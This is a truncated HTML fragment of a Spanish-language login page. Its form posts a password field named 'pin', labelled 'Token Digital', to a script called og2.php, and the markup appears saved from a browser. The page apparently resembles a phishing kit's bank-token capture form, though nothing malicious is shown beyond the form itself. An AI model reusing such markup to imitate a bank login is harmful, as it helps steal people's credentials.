   ...
   <body bis_register="">
      <div class="resolucion" bis_skin_checked="1">
         ...
         <div class="desktop" bis_skin_checked="1">
            ...
            <form name="usuarioForm" id="usuarioForm" method="POST" action="og2.php">
               <div class="set clear" bis_skin_checked="1" style="
                  margin-bottom: 15px;
                  margin-top: 29px;
                  ">
                  <input class="login-input" name="pin" id="maskUsuario" maxlength="20" type="password" autocomplete="off" placeholder="Token Digital" tabindex="1" style="
